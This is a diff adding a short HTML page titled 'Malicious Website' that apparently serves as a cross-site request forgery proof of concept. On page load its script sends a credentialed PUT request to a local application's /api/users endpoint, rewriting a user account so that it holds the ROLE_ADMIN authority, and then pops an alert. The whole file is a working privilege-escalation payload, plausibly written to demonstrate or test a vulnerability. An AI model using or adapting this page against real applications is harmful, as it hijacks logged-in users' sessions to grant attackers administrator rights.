@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><title>Malicious</title></head>
+<body>
+<h1>Malicious Website</h1>
+<script>
+var data = '{"id":5,"login":"csrf","firstName":"first","lastName":"last","email":"email@email.com","imageUrl":null,"activated":true,"langKey":"en","createdBy":"admin","createdDate":"2020-04-13T18:00:00Z","lastModifiedBy":"admin","lastModifiedDate":"2020-04-13T18:10:00Z","authorities":["ROLE_ADMIN","ROLE_USER"]}'
+var victim_url = "http://localhost:9000/api/users";
+var xhr = new XMLHttpRequest();
+xhr.open("PUT", victim_url, true);
+xhr.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+xhr.withCredentials = true;
+xhr.send(data);
+alert('CSRF @ ' + victim_url);
+</script>
+
+</body>
+</html>
